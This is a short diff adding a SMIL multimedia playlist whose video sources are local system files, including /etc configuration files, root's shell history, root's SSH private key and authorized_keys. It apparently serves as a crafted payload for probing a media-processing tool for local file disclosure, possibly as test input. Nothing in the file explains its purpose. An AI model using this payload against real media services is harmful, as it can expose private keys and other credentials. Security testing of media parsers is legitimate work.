@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil>
+  <body>
+    <switch>
+      <video src="/etc/os-release"/>
+      <video src="/etc/localtime"/>
+      <video src="/etc/mtab"/>
+      <video src="/etc/ssl/certs/ca-certificates.crt"/>
+      <video src="/etc/ca-certificates.conf"/>
+      <video src="/etc/apt/sources.list"/>
+      <video src="/etc/dpkg/dpkg.cfg"/>
+      <video src="/root/.bash_history"/>
+      <video src="/root/.ssh/id_rsa"/>
+      <video src="/root/.ssh/authorized_keys"/>
+    </switch>
+  </body>
+</smil>
